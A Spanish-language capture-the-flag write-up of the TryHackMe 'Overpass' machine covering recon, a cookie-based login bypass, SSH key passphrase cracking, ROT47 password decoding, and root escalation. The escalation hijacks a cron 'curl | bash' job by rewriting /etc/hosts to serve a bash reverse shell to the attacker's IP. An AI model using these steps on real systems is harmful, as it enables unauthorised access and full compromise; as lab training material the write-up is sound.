---
title: Try Hack Me Overpass
author: k4miyo
date: 2023-06-23
math: true
mermaid: true
image:
  path: /assets/images/thm/tryhackme.png
categories: [Easy, Linux]
tags: [Web, Cookies, Cron, SSH]
ping: true
---

## Máquina Overpass
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.65.144.

```bash
❯ ping -c 1 10.10.65.144
PING 10.10.65.144 (10.10.65.144) 56(84) bytes of data.
64 bytes from 10.10.65.144: icmp_seq=1 ttl=63 time=153 ms

--- 10.10.65.144 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 152.770/152.770/152.770/0.000 ms

```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.10.65.144 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 19:51 CST
Initiating Parallel DNS resolution of 1 host. at 19:51
Completed Parallel DNS resolution of 1 host. at 19:51, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 19:51
Scanning 10.10.65.144 [65535 ports]
Discovered open port 22/tcp on 10.10.65.144
Discovered open port 80/tcp on 10.10.65.144
Completed SYN Stealth Scan at 19:51, 14.51s elapsed (65535 total ports)
Nmap scan report for 10.10.65.144
Host is up, received user-set (0.15s latency).
Scanned at 2023-06-23 19:51:34 CST for 15s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.67 seconds
           Raw packets sent: 71373 (3.140MB) | Rcvd: 71373 (2.855MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.65.144
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboar
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p22,80 10.10.65.144 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 19:52 CST
Nmap scan report for 10.10.65.144
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37968598d1009c1463d9b03475b1f957 (RSA)
|   256 5375fac065daddb1e8dd40b8f6823924 (ECDSA)
|_  256 1c4ada1f36546da6c61700272e67759c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.78 seconds

```

Vamos a ver a lo que nos enfrentamos por el puerto 80 con un `whatweb`:

```bash
❯ whatweb http://10.10.65.144/
http://10.10.65.144/ [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.65.144], Script, Title[Overpass], X-UA-Compatible[IE=edge]
```

No vemos nada interesante, por lo que vamos a visualizar el contenido vía web:

![](/assets/images/thm-overpass/overpass.png)

Tampoco vemos nada interesante, por lo que vamos a tratar de descubrir recursos en el sitio web:

```bash
❯ wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.65.144/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.65.144/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000025:   200        5 L      8 W        183 Ch      "img"                                                                                                                       
000000055:   200        46 L     131 W      1987 Ch     "downloads"                                                                                                                 
000000142:   200        38 L     161 W      1749 Ch     "aboutus"                                                                                                                   
000000245:   200        39 L     93 W       1525 Ch     "admin"                                                                                                                     
000000536:   200        4 L      6 W        79 Ch       "css"                                                                                                                       
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 1331
Filtered Requests: 1326
Requests/sec.: 0
```

Nos llama la atención el recurso **admin**:

![](/assets/images/thm-overpass/overpass1.png)

Vemos un panel de acceso pero no tenemos credenciales y probando las más comunes, no podemos ingresar. Si analizamos el un poco los recursos del servidor, encontramos el archivo **login.js**:

![](/assets/images/thm-overpass/overpass2.png)

Analizando un poco el archivo, en la parte del condicional, se tiene las siguientes lineas:

```js
if (statusOrCookie === "Incorrect credentials") {
	loginStatus.textContent = "Incorrect Credentials"
    passwordBox.value=""
} else {
	Cookies.set("SessionToken",statusOrCookie)
    window.location = "/admin"
}
```

Si el login es exitoso, se crea la cookie **SessionToken** cuyo valor debe ser ***statusOrCookie***; por lo tanto, con ayuda del plugin **EditThisCookie** podemos crearla y refrescar la página.

![](/assets/images/thm-overpass/overpass3.png)

Tenemos una llave, por lo tanto la copiamos y guardamos en nuestra máquina como `id_rsa` para poder acceder vía ssh. Si lo intentamos, vemos que nos pedirá contraseña, por lo tanto, debemos obtener el hash y tratar de crackearla.

```bash
❯ python3 ssh2john.py id_rsa > hash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 16 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa)
1g 0:00:00:05 DONE (2023-06-23 20:27) 0.1848g/s 2650Kp/s 2650Kc/s 2650KC/s  0125457423 ..*7¡Vamos!
Session completed
```

Ya tenemos la contraseña, por lo que tratamos de acceder vía ssh como el usuario **james** (se observa en el sitio web donde está la llave) :

```bash
❯ chmod 600 id_rsa
❯ ssh james@10.10.65.144 -i id_rsa
The authenticity of host '10.10.65.144 (10.10.65.144)' can't be established.
ECDSA key fingerprint is SHA256:4P0PNh/u8bKjshfc6DBYwWnjk1Txh5laY/WbVPrCUdY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.65.144' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jun 24 02:29:05 UTC 2023

  System load:  0.0                Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 12%                IP address for eth0: 10.10.65.144
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ whoami
james
james@overpass-prod:~$
```

A este punto ya podemos visualizar la primera flag (user.txt). Ahora debemos encontrar una manera de escalar privilegios:

```bash
james@overpass-prod:~$ cat todo.txt 
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
james@overpass-prod:~$
```

El mensaje en el archivo `todo.txt` nos dice que james guardó su contraseña en una nota y lo más seguro es que sea el archivo `.overpass`; por lo que vamos a echarle un ojo:

```bash
james@overpass-prod:~$ cat .overpass; echo
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
james@overpass-prod:~$
```

Vemos que utiliza un tipo de cifrado pero no sabemos cual puede ser. Para eso, debemos descargar el programa que se utilizar para cifrar en `http://X.X.X.X/downloads/`:

![](/assets/images/thm-overpass/overpass4.png)

Vamos a ver el contenido de dicho archivo:

```bash
❯ catn overpass.go
package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"strconv"
	"strings"

	"github.com/mitchellh/go-homedir"
)

...

//Encrypt the credentials and write them to a file.
func saveCredsToFile(filepath string, passlist []passListEntry) string {
	file, err := os.OpenFile(filepath, os.O_TRUNC|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println(err.Error())
		return err.Error()
	}
	defer file.Close()
	stringToWrite := rot47(credsToJSON(passlist))
	if _, err := file.WriteString(stringToWrite); err != nil {
		fmt.Println(err.Error())
		return err.Error()
	}
	return "Success"
}
...
```

En la función `saveCredsToFile` vemos que la variable `stringToWrite` hace referencia aun **ROT47**; por lo que podriamos tratar de búscar cualquier descifrador online y probar para **ROT47**.

![](/assets/images/thm-overpass/overpass5.png)

Ya encontramos la contraseña del usuario **james**. Ahora vamos a enumerar un poco el sistema para determinar como escalar privilegios:

```bash
james@overpass-prod:~$ id
uid=1001(james) gid=1001(james) groups=1001(james)
james@overpass-prod:~$ sudo - l
[sudo] password for james: 
james is not in the sudoers file.  This incident will be reported.
james@overpass-prod:~$ find / \-perm /4000 2>/dev/null
/bin/fusermount
/bin/umount
/bin/su
/bin/mount
/bin/ping
/usr/bin/chfn
/usr/bin/at
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
james@overpass-prod:~$
```

Podríamos tratar de explotar la vulnerabilidad sobre `/usr/bin/pkexec` conocida como [**Polkit Privilege Escalation**](https://github.com/berdav/CVE-2021-4034); sin embargo, vamos a escalar privilegios como está pensada la máquina. Por lo tanto, vamos tratar de descubrir procesos que se ejecutan a intervalos regulares con nuestra herramienta [Procmon](/posts/procmon) o utilizar [PSPY](https://github.com/DominicBreuker/pspy):

```bash
james@overpass-prod:~$ cd /dev/shm/
james@overpass-prod:/dev/shm$ vi procmon.sh
james@overpass-prod:/dev/shm$ chmod +x procmon.sh
james@overpass-prod:/dev/shm$ ./procmon.sh 
> /usr/sbin/CRON -f
> /bin/sh -c curl overpass.thm/downloads/src/buildscript.sh | bash
> curl overpass.thm/downloads/src/buildscript.sh
> bash
< curl overpass.thm/downloads/src/buildscript.sh
> /usr/local/go/bin/go build -o /root/builds/overpassLinux /root/src/overpass.go
< /usr/local/go/bin/go build -o /root/builds/overpassLinux /root/src/overpass.go
< /usr/sbin/CRON -f
< /bin/sh -c curl overpass.thm/downloads/src/buildscript.sh | bash
< bash
^C
james@overpass-prod:/dev/shm$ 
```

Vemos que se hace un `curl` hacia el dominio `overpass.thm` y buscar el archivo `buildscript.sh`, el contenido de dicho archivo se ejecuta con una `bash`; por lo que vamos a echarle un ojo el archivo  `/etc/hosts` para ver cual es la dirección IP a la que apunta el dominio.

```bash
james@overpass-prod:/dev/shm$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
james@overpass-prod:/dev/shm$ ls -la /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
james@overpass-prod:/dev/shm$ 
```

Vemos que el domino `overpass.thm` apunta a la 127.0.0.1 y además tenemos permisos de escritura sobre dicho archivo; por lo tanto, primero debemos crearnos un archivo llamado `buildscript.sh` que lo guardaremos en la ruta `downloads/src/` dentro de nuestra máquina de atacante. Dicho archivo contendrá una reverse shell:

```bash
❯ pwd
/home/k4miyo/Documents/TryHackMe/Overpass/content/downloads/src
❯ ll
.rwxr-xr-x root root 53 B Fri Jun 23 22:48:32 2023  buildscript.sh
❯ cat buildscript.sh
───────┬─────────────────────────────────────────────────────────────
       │ File: buildscript.sh
───────┼─────────────────────────────────────────────────────────────
   1   │ #!/bin/bash
   2   │ 
   3   │ bash -i >& /dev/tcp/10.9.85.95/443 0>&1
───────┴─────────────────────────────────────────────────────────────
```

Ahora nos posicionamos en donde se encuentra la carpeta `downloads` y compartimos un servidor HTTP con python:

```bash
❯ pwd
/home/k4miyo/Documents/TryHackMe/Overpass/content
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Nos ponemos en escucha por el puerto 443:

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Y ahora, en la máquina víctima cambiamos la dirección IP del dominio `overpass.thm` por nuestra dirección IP de atacante:

```bash
james@overpass-prod:/dev/shm$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
10.9.85.95 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
james@overpass-prod:/dev/shm$
```

Esperamos a que se ejecute el proceso:

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.30.247 - - [25/Jun/2023 15:52:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.9.85.95] from (UNKNOWN) [10.10.30.247] 39924
bash: cannot set terminal process group (11456): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~# whoami
whoami
root
root@overpass-prod:~# 
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).